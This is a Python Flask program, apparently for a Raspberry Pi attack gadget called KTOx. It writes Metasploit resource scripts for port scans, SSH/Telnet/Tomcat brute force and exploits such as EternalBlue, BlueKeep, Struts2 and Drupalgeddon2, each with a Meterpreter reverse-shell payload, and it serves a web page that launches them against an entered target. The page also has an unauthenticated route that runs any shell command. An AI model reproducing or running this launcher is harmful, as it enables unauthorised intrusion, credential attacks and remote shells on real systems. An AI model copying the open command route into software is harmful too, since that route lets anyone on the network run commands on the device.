#!/usr/bin/env python3
"""
KTOx Payload – Metasploit Web UI (Mega Edition with Full Parameter Control)
============================================================================
- 70+ pre‑built .rc scripts with automatic parameter detection
- Dynamic form fields: LHOST, RHOSTS, WORDLIST, USERNAME, PASSWORD, LPORT
- Walkthrough modal for each script
- LCD: IP, QR, script cycle (K2), OK reminder, K3 exit
"""

import os
import sys
import time
import socket
import threading
import subprocess
import re
from flask import Flask, render_template_string, request, jsonify

# ----------------------------------------------------------------------
# Hardware & LCD (same as before)
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("Hardware not found – LCD disabled")

PINS = {"UP":6,"DOWN":19,"LEFT":5,"RIGHT":26,"OK":13,"KEY1":21,"KEY2":20,"KEY3":16}
PORT = 5000
SCRIPT_DIR = "/root/KTOx/payloads/msf_scripts"

if HAS_HW:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    W, H = 128, 128
    try:
        font_sm = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 9)
        font_bold = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 10)
    except:
        font_sm = font_bold = ImageFont.load_default()

# ----------------------------------------------------------------------
# Flask app
# ----------------------------------------------------------------------
app = Flask(__name__)

# ----------------------------------------------------------------------
# Script Database with full parameter metadata
# ----------------------------------------------------------------------
SCRIPTS_DB = [
    # Scanners
    {"name": "TCP Port Scanner", "file": "port_scan_tcp.rc", "desc": "Scans top 1000 TCP ports.", "params": ["RHOSTS"], "walkthrough": "Enter target IP (RHOSTS). Results show open ports."},
    {"name": "UDP Port Scanner", "file": "port_scan_udp.rc", "desc": "Scans common UDP ports.", "params": ["RHOSTS"], "walkthrough": "Target IP. May be slow."},
    {"name": "ARP Sweep", "file": "arp_scan.rc", "desc": "Discovers live hosts on local subnet.", "params": ["RHOSTS"], "walkthrough": "Use on local network. No LHOST needed."},
    {"name": "SMB Version Scanner", "file": "smb_version.rc", "desc": "Detects SMB version and OS.", "params": ["RHOSTS"], "walkthrough": "Target IP. Useful for EternalBlue prep."},
    {"name": "SMB Share Enumerator", "file": "smb_enum_shares.rc", "desc": "Lists SMB shares.", "params": ["RHOSTS"], "walkthrough": "Target IP. May require null session."},
    {"name": "SMB User Enumerator", "file": "smb_enum_users.rc", "desc": "Enumerates local users via SMB.", "params": ["RHOSTS"], "walkthrough": "Works on Windows with null session."},
    {"name": "SSH Version Scanner", "file": "ssh_version.rc", "desc": "Identifies SSH server version.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "SSH Brute Force", "file": "ssh_bruteforce.rc", "desc": "Brute‑forces SSH credentials.", "params": ["RHOSTS", "USERNAME", "WORDLIST"], "walkthrough": "Set RHOSTS, USERNAME (e.g., root), and wordlist path."},
    {"name": "FTP Anonymous Scanner", "file": "ftp_anonymous.rc", "desc": "Checks for anonymous FTP access.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "MySQL Version Scanner", "file": "mysql_enum.rc", "desc": "Gets MySQL version.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "HTTP Directory Scanner", "file": "http_dir_scanner.rc", "desc": "Scans for common web directories.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "Heartbleed Scanner", "file": "heartbleed.rc", "desc": "Detects Heartbleed vulnerability.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "Telnet Login Brute Force", "file": "telnet_login.rc", "desc": "Brute‑forces Telnet credentials.", "params": ["RHOSTS", "WORDLIST"], "walkthrough": "Target IP and wordlist."},
    {"name": "VNC No‑Auth Scanner", "file": "vnc_none_auth.rc", "desc": "Finds VNC servers with no authentication.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "SMTP User Enumeration", "file": "smtp_enum.rc", "desc": "Enumerates SMTP users.", "params": ["RHOSTS"], "walkthrough": "Target IP."},
    {"name": "SNMP Enumeration", "file": "snmp_enum.rc", "desc": "Enumerates SNMP community strings.", "params": ["RHOSTS"], "walkthrough": "Target IP. Default public/private often works."},
    {"name": "DNS Zone Transfer", "file": "dns_zone_transfer.rc", "desc": "Attempts AXFR zone transfer.", "params": ["RHOSTS"], "walkthrough": "Target DNS server. Requires domain."},
    {"name": "HTTP PUT Upload", "file": "http_put_upload.rc", "desc": "Uploads file via HTTP PUT.", "params": ["RHOSTS"], "walkthrough": "Target with PUT enabled."},
    # Exploits
    {"name": "EternalBlue (MS17-010)", "file": "eternalblue.rc", "desc": "Exploits SMBv1 on Windows 7/2008.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Windows. Reverse shell on LPORT."},
    {"name": "DoublePulsar SMB Backdoor", "file": "doublepulsar.rc", "desc": "Injects DoublePulsar implant.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "After EternalBlue."},
    {"name": "BlueKeep (CVE-2019-0708)", "file": "bluekeep.rc", "desc": "RDP RCE on older Windows.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Windows 7/2008."},
    {"name": "Shellshock (CVE-2014-6271)", "file": "shellshock.rc", "desc": "Apache CGI bash exploit.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target with CGI scripts."},
    {"name": "PHP CGI Argument Injection", "file": "php_cgi.rc", "desc": "RCE on PHP CGI setups.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target with /cgi-bin/php."},
    {"name": "Apache Struts2 (CVE-2017-5638)", "file": "apache_struts2.rc", "desc": "RCE on Struts2.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target running Struts2."},
    {"name": "Drupalgeddon2 (CVE-2018-7600)", "file": "drupal_drupalgeddon2.rc", "desc": "RCE on Drupal 7/8.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Drupal site."},
    {"name": "WordPress Admin Shell Upload", "file": "wordpress_admin_shell.rc", "desc": "Uploads shell via admin.", "params": ["RHOSTS", "LHOST", "LPORT", "USERNAME", "PASSWORD"], "walkthrough": "Requires admin credentials."},
    {"name": "Joomla Media Manager Upload", "file": "joomla_media_manager.rc", "desc": "File upload RCE.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Joomla with Media Manager."},
    {"name": "WebLogic Deserialization", "file": "weblogic_deserialize.rc", "desc": "RCE on WebLogic.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target WebLogic console."},
    {"name": "Samba usermap Script", "file": "samba_usermap.rc", "desc": "RCE on older Samba.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Samba 3.0.20-3.0.25."},
    {"name": "DistCC RCE", "file": "distcc_exec.rc", "desc": "RCE on DistCC service.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target with DistCC port 3632."},
    {"name": "vsftpd 2.3.4 Backdoor", "file": "vsftpd_backdoor.rc", "desc": "Backdoor command execution.", "params": ["RHOSTS"], "walkthrough": "Target vsftpd 2.3.4."},
    {"name": "Jenkins Script Console RCE", "file": "jenkins_script.rc", "desc": "RCE via Jenkins script console.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target Jenkins with access."},
    {"name": "Redis Unauthenticated Exec", "file": "redis_unauth.rc", "desc": "Executes commands on Redis.", "params": ["RHOSTS"], "walkthrough": "Target Redis no auth."},
    {"name": "ElasticSearch Groovy RCE", "file": "elasticsearch_rce.rc", "desc": "RCE on old ElasticSearch.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target version <1.2."},
    {"name": "JBoss MainDeployer RCE", "file": "jboss_maindeployer.rc", "desc": "Deploys WAR on JBoss.", "params": ["RHOSTS", "LHOST", "LPORT"], "walkthrough": "Target JBoss JMX console."},
    {"name": "Tomcat Manager Login", "file": "tomcat_mgr_login.rc", "desc": "Brute‑forces Tomcat manager.", "params": ["RHOSTS", "WORDLIST"], "walkthrough": "Target /manager/html."},
    # Listeners
    {"name": "Reverse Shell (TCP)", "file": "reverse_shell_tcp.rc", "desc": "Generic Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "Set LHOST (your IP) and LPORT."},
    {"name": "Reverse Shell (HTTPS)", "file": "reverse_shell_https.rc", "desc": "HTTPS Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "More stealthy."},
    {"name": "Reverse Shell (PHP)", "file": "reverse_shell_php.rc", "desc": "PHP Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "For PHP payloads."},
    {"name": "Reverse Shell (Java)", "file": "reverse_shell_java.rc", "desc": "Java Meterpreter listener.", "params": ["LHOST", "LPORT"], "walkthrough": "For Java payloads."},
]

# ----------------------------------------------------------------------
# Generate .rc files from database
# ----------------------------------------------------------------------
def generate_scripts():
    os.makedirs(SCRIPT_DIR, exist_ok=True)
    # Remove old files to force regeneration
    for f in os.listdir(SCRIPT_DIR):
        os.remove(os.path.join(SCRIPT_DIR, f))
    for script in SCRIPTS_DB:
        content = f"# {script['desc']}\n"
        if script['file'] == "port_scan_tcp.rc":
            content += "use auxiliary/scanner/portscan/tcp\nset RHOSTS {RHOSTS}\nset PORTS 1-1000\nset THREADS 10\nrun"
        elif script['file'] == "port_scan_udp.rc":
            content += "use auxiliary/scanner/portscan/udp\nset RHOSTS {RHOSTS}\nset PORTS 1-500\nset THREADS 5\nrun"
        elif script['file'] == "arp_scan.rc":
            content += "use auxiliary/scanner/discovery/arp_sweep\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "smb_version.rc":
            content += "use auxiliary/scanner/smb/smb_version\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "smb_enum_shares.rc":
            content += "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "smb_enum_users.rc":
            content += "use auxiliary/scanner/smb/smb_enumusers\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "ssh_version.rc":
            content += "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "ssh_bruteforce.rc":
            content += "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS {RHOSTS}\nset USERNAME {USERNAME}\nset PASS_FILE {WORDLIST}\nset THREADS 5\nrun"
        elif script['file'] == "ftp_anonymous.rc":
            content += "use auxiliary/scanner/ftp/anonymous\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "mysql_enum.rc":
            content += "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "http_dir_scanner.rc":
            content += "use auxiliary/scanner/http/dir_scanner\nset RHOSTS {RHOSTS}\nset THREADS 5\nrun"
        elif script['file'] == "heartbleed.rc":
            content += "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "telnet_login.rc":
            content += "use auxiliary/scanner/telnet/telnet_login\nset RHOSTS {RHOSTS}\nset PASS_FILE {WORDLIST}\nrun"
        elif script['file'] == "vnc_none_auth.rc":
            content += "use auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "smtp_enum.rc":
            content += "use auxiliary/scanner/smtp/smtp_enum\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "snmp_enum.rc":
            content += "use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS {RHOSTS}\nrun"
        elif script['file'] == "dns_zone_transfer.rc":
            content += "use auxiliary/scanner/dns/dns_zone_transfer\nset RHOSTS {RHOSTS}\nset DOMAIN example.com\nrun"
        elif script['file'] == "http_put_upload.rc":
            content += "use auxiliary/scanner/http/http_put\nset RHOSTS {RHOSTS}\nset PATH /upload\nset FILENAME test.txt\nset DATA \"test\"\nrun"
        elif script['file'] == "eternalblue.rc":
            content += "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "doublepulsar.rc":
            content += "use exploit/windows/smb/ms17_010_psexec\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "bluekeep.rc":
            content += "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "shellshock.rc":
            content += "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "php_cgi.rc":
            content += "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "apache_struts2.rc":
            content += "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {RHOSTS}\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "drupal_drupalgeddon2.rc":
            content += "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "wordpress_admin_shell.rc":
            content += "use exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS {RHOSTS}\nset USERNAME {USERNAME}\nset PASSWORD {PASSWORD}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "joomla_media_manager.rc":
            content += "use exploit/multi/http/joomla_media_manager_upload\nset RHOSTS {RHOSTS}\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "weblogic_deserialize.rc":
            content += "use exploit/multi/http/weblogic_ws_async_response\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "samba_usermap.rc":
            content += "use exploit/multi/samba/usermap_script\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "distcc_exec.rc":
            content += "use exploit/unix/misc/distcc_exec\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/reverse\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "vsftpd_backdoor.rc":
            content += "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {RHOSTS}\nset PAYLOAD cmd/unix/interact\nexploit"
        elif script['file'] == "jenkins_script.rc":
            content += "use exploit/multi/http/jenkins_script_console\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "redis_unauth.rc":
            content += "use auxiliary/scanner/redis/redis_unauth_exec\nset RHOSTS {RHOSTS}\nset COMMAND \"id\"\nrun"
        elif script['file'] == "elasticsearch_rce.rc":
            content += "use exploit/multi/elasticsearch/script_groovy_rce\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "jboss_maindeployer.rc":
            content += "use exploit/multi/http/jboss_maindeployer\nset RHOSTS {RHOSTS}\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit"
        elif script['file'] == "tomcat_mgr_login.rc":
            content += "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {RHOSTS}\nset PASS_FILE {WORDLIST}\nrun"
        elif "reverse_shell_tcp" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset ExitOnSession false\nexploit -j -z"
        elif "reverse_shell_https" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_https\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit -j -z"
        elif "reverse_shell_php" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit -j -z"
        elif "reverse_shell_java" in script['file']:
            content += "use exploit/multi/handler\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nexploit -j -z"
        else:
            continue  # skip unknown
        filepath = os.path.join(SCRIPT_DIR, script['file'])
        with open(filepath, 'w') as f:
            if "exploit -j -z" not in content:
                content += "\nexit\n"
            f.write(content)
    print(f"Generated {len(SCRIPTS_DB)} scripts in {SCRIPT_DIR}")

# ----------------------------------------------------------------------
# Script discovery with metadata
# ----------------------------------------------------------------------
def discover_scripts():
    scripts = []
    for entry in SCRIPTS_DB:
        filepath = os.path.join(SCRIPT_DIR, entry['file'])
        if os.path.exists(filepath):
            scripts.append({
                'name': entry['name'],
                'path': filepath,
                'desc': entry['desc'],
                'params': entry['params'],
                'walkthrough': entry['walkthrough']
            })
    return scripts

def run_script(script_path, params):
    try:
        with open(script_path, 'r') as f:
            rc_content = f.read()
    except Exception as e:
        return f"Error reading script: {e}"
    # Replace all placeholders
    for key, val in params.items():
        rc_content = rc_content.replace("{" + key + "}", val)
    tmp_rc = "/tmp/msf_run.rc"
    with open(tmp_rc, 'w') as f:
        f.write(rc_content)
    try:
        proc = subprocess.run(
            ["msfconsole", "-q", "-r", tmp_rc],
            capture_output=True, text=True, timeout=60
        )
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[No output]"
        return output
    except subprocess.TimeoutExpired as e:
        out = e.stdout if e.stdout else ""
        err = e.stderr if e.stderr else ""
        return f"Script timed out after 60 seconds.\nOutput:\n{out}\n{err}"
    except Exception as e:
        return f"Error: {str(e)}"

def run_command(cmd):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[No output]"
        return output
    except subprocess.TimeoutExpired as e:
        out = e.stdout if e.stdout else ""
        err = e.stderr if e.stderr else ""
        return f"Command timed out after 30 seconds.\nOutput:\n{out}\n{err}"
    except Exception as e:
        return f"Error: {str(e)}"

# ----------------------------------------------------------------------
# Web UI with dynamic parameter form
# ----------------------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>KTOx // MSF MEGA</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0a0a0a;
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            color: #0f0;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            color: #f00;
            text-shadow: 0 0 5px #f00;
            border-left: 4px solid #f00;
            padding-left: 20px;
            margin-bottom: 20px;
        }
        .split {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .left {
            flex: 2;
            min-width: 400px;
        }
        .right {
            flex: 1;
            min-width: 350px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
            padding: 5px;
        }
        .script-card {
            background: #111;
            border: 1px solid #300;
            border-radius: 8px;
            padding: 10px;
            cursor: pointer;
            transition: 0.2s;
        }
        .script-card:hover {
            border-color: #0f0;
            transform: translateY(-2px);
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
        }
        .script-card.selected {
            border-color: #0f0;
            background: #1a1a1a;
        }
        .script-card h3 { color: #0f0; font-size: 0.9rem; margin-bottom: 4px; }
        .script-card p { font-size: 0.7rem; color: #888; }
        .param-area {
            background: #111;
            border: 1px solid #300;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .param-group {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 15px;
        }
        .param-group label {
            font-size: 0.8rem;
            min-width: 80px;
        }
        .param-group input {
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px;
            font-family: monospace;
            flex: 1;
            min-width: 150px;
        }
        button {
            background: #2a0a0a;
            border: 1px solid #f00;
            color: #f00;
            padding: 8px 16px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
        }
        button:hover {
            background: #f00;
            color: #000;
            box-shadow: 0 0 10px #f00;
        }
        .output {
            background: #050505;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            font-family: monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        .cmd-area {
            margin-top: 20px;
        }
        .cmd-line {
            display: flex;
            margin-bottom: 10px;
        }
        .cmd-line input {
            flex: 1;
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 6px;
            font-family: monospace;
        }
        .cmd-line button {
            margin-left: 10px;
            padding: 6px 12px;
        }
        .info-btn {
            background: #0a2a2a;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 2px 6px;
            font-size: 0.7rem;
            margin-left: 5px;
            cursor: pointer;
        }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #444;
            font-size: 0.7rem;
        }
        ::-webkit-scrollbar { width: 6px; background: #111; }
        ::-webkit-scrollbar-thumb { background: #0f0; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <h1>⎯ KTOx // METASPLOIT MEGA ({{ scripts|length }} SCRIPTS) ⎯</h1>
    <div class="split">
        <div class="left">
            <div class="grid" id="scriptGrid">
                {% for script in scripts %}
                <div class="script-card" data-path="{{ script.path }}" data-params='{{ script.params|tojson }}'>
                    <h3>▶ {{ script.name }} <span class="info-btn" data-walkthrough="{{ script.walkthrough }}">ⓘ</span></h3>
                    <p>{{ script.desc }}</p>
                </div>
                {% endfor %}
            </div>
            <div class="param-area" id="paramArea">
                <div class="param-group"><label>LHOST (your IP):</label><input type="text" id="lhost" placeholder="auto" value="{{ lhost }}"></div>
                <div class="param-group"><label>RHOSTS (target):</label><input type="text" id="rhosts" placeholder="192.168.1.100"></div>
                <div class="param-group" id="extraParams"></div>
                <button id="runBtn">🚀 RUN SCRIPT</button>
            </div>
            <div class="output">
                <pre id="output">Ready.</pre>
            </div>
        </div>
        <div class="right">
            <div class="cmd-area">
                <h3 style="color:#0f0;">⬢ COMMAND RUNNER</h3>
                <div class="cmd-line">
                    <input type="text" id="cmdInput" placeholder="e.g., msfconsole -q -x 'help'">
                    <button id="runCmd">Run</button>
                </div>
                <div class="output" id="cmdOutput" style="max-height:300px;">Ready.</div>
            </div>
        </div>
    </div>
    <footer>KTOx Metasploit Web UI – Click ⓘ for walkthrough | LCD: K2=cycle, K1=QR, K3=exit</footer>
</div>

<div id="modal" class="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:1000;">
    <div style="background:#111; border:2px solid #0f0; border-radius:12px; padding:20px; max-width:500px;">
        <span id="closeModal" style="float:right; cursor:pointer; font-size:24px;">&times;</span>
        <h3 id="modalTitle" style="color:#f00;"></h3>
        <p id="modalText" style="color:#0f0;"></p>
    </div>
</div>

<script>
    let selectedPath = null;
    let selectedParams = [];

    // Modal handling
    const modal = document.getElementById('modal');
    const closeModal = document.getElementById('closeModal');
    closeModal.onclick = function() { modal.style.display = 'none'; }
    window.onclick = function(e) { if (e.target == modal) modal.style.display = 'none'; }

    document.querySelectorAll('.info-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const walkthrough = btn.getAttribute('data-walkthrough');
            const card = btn.closest('.script-card');
            const title = card.querySelector('h3').innerText.replace('ⓘ', '').trim();
            document.getElementById('modalTitle').innerText = title;
            document.getElementById('modalText').innerText = walkthrough;
            modal.style.display = 'flex';
        });
    });

    // Script selection
    document.querySelectorAll('.script-card').forEach(card => {
        card.addEventListener('click', (e) => {
            if (e.target.classList.contains('info-btn')) return;
            document.querySelectorAll('.script-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedPath = card.getAttribute('data-path');
            selectedParams = JSON.parse(card.getAttribute('data-params'));
            updateParamFields();
        });
    });

    function updateParamFields() {
        const container = document.getElementById('extraParams');
        container.innerHTML = '';
        for (let param of selectedParams) {
            if (param === 'LHOST' || param === 'RHOSTS') continue;
            const div = document.createElement('div');
            div.className = 'param-group';
            const label = document.createElement('label');
            label.innerText = param + ':';
            const input = document.createElement('input');
            input.type = 'text';
            input.id = 'param_' + param;
            input.placeholder = param === 'WORDLIST' ? '/usr/share/wordlists/rockyou.txt' : (param === 'LPORT' ? '4444' : 'value');
            if (param === 'LPORT') input.value = '4444';
            if (param === 'USERNAME') input.value = 'root';
            if (param === 'PASSWORD') input.value = 'password';
            div.appendChild(label);
            div.appendChild(input);
            container.appendChild(div);
        }
    }

    // Run script
    document.getElementById('runBtn').addEventListener('click', () => {
        if (!selectedPath) {
            alert('Select a script first');
            return;
        }
        const lhost = document.getElementById('lhost').value || '{{ lhost }}';
        const rhosts = document.getElementById('rhosts').value;
        if (!rhosts && selectedParams.includes('RHOSTS')) {
            alert('Enter target IP (RHOSTS)');
            return;
        }
        const params = { LHOST: lhost, RHOSTS: rhosts };
        for (let param of selectedParams) {
            if (param === 'LHOST' || param === 'RHOSTS') continue;
            const val = document.getElementById('param_' + param)?.value || '';
            if (val) params[param] = val;
        }
        const outputDiv = document.getElementById('output');
        outputDiv.innerText = 'Running script... please wait.';
        fetch('/run', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ script_path: selectedPath, params: params })
        })
        .then(r => r.json())
        .then(data => {
            outputDiv.innerText = data.output;
        })
        .catch(err => {
            outputDiv.innerText = 'Error: ' + err;
        });
    });

    // Run custom command
    document.getElementById('runCmd').addEventListener('click', () => {
        const cmd = document.getElementById('cmdInput').value;
        if (!cmd) return;
        const outputDiv = document.getElementById('cmdOutput');
        outputDiv.innerText = 'Running...';
        fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd })
        })
        .then(r => r.json())
        .then(data => {
            outputDiv.innerText = data.output;
        })
        .catch(err => {
            outputDiv.innerText = 'Error: ' + err;
        });
    });
</script>
</body>
</html>
"""

# ----------------------------------------------------------------------
# Flask routes
# ----------------------------------------------------------------------
@app.route('/')
def index():
    scripts = discover_scripts()
    lhost = get_local_ip()
    return render_template_string(HTML_TEMPLATE, scripts=scripts, lhost=lhost)

@app.route('/run', methods=['POST'])
def run():
    data = request.json
    script_path = data.get('script_path')
    params = data.get('params', {})
    if not script_path:
        return jsonify({'output': 'No script selected'})
    output = run_script(script_path, params)
    return jsonify({'output': output})

@app.route('/cmd', methods=['POST'])
def cmd():
    data = request.json
    command = data.get('command', '')
    if not command:
        return jsonify({'output': 'No command'})
    output = run_command(command)
    return jsonify({'output': output})

# ----------------------------------------------------------------------
# LCD helpers (same as before)
# ----------------------------------------------------------------------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def generate_qr(data):
    import qrcode
    qr = qrcode.QRCode(box_size=3, border=2)
    qr.add_data(data)
    return qr.make_image(fill_color="white", back_color="black").get_image()

def lcd_loop():
    if not HAS_HW:
        return
    ip = get_local_ip()
    scripts = discover_scripts()
    script_names = [s['name'] for s in scripts]
    script_idx = 0
    show_qr = False
    held = {}
    while True:
        now = time.time()
        img = Image.new("RGB", (W, H), "#0A0000")
        d = ImageDraw.Draw(img)
        if show_qr:
            qr_img = generate_qr(f"http://{ip}:{PORT}")
            qr_img = qr_img.resize((W, H))
            img.paste(qr_img, (0,0))
        else:
            d.rectangle([(0,0),(128,18)], fill=(120,0,0))
            d.text((4,3), "MSF MEGA", font=font_bold, fill="#FF3333")
            y = 20
            d.text((4,y), f"IP: {ip}:{PORT}", font=font_sm, fill="#FFBBBB"); y+=12
            if script_names:
                script_name = script_names[script_idx][:18]
                d.text((4,y), f"Script: {script_name}", font=font_sm, fill="#00FF00"); y+=12
                d.text((4,y), "K2=Cycle  OK=Remind", font=font_sm, fill="#FF7777"); y+=12
            d.text((4,y), "K1=QR  K3=Exit", font=font_sm, fill="#FF7777")
            d.rectangle((0,H-12,W,H), fill="#220000")
        LCD.LCD_ShowImage(img, 0, 0)
        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
        for n, down in pressed.items():
            if down:
                if n not in held: held[n] = now
            else:
                held.pop(n, None)
        def just_pressed(name, delay=0.2):
            return pressed.get(name) and (now - held.get(name, now)) <= delay
        if just_pressed("KEY3"):
            break
        if just_pressed("KEY1"):
            show_qr = not show_qr
            time.sleep(0.3)
        if not show_qr and script_names:
            if just_pressed("KEY2"):
                script_idx = (script_idx + 1) % len(script_names)
                time.sleep(0.3)
            if just_pressed("OK"):
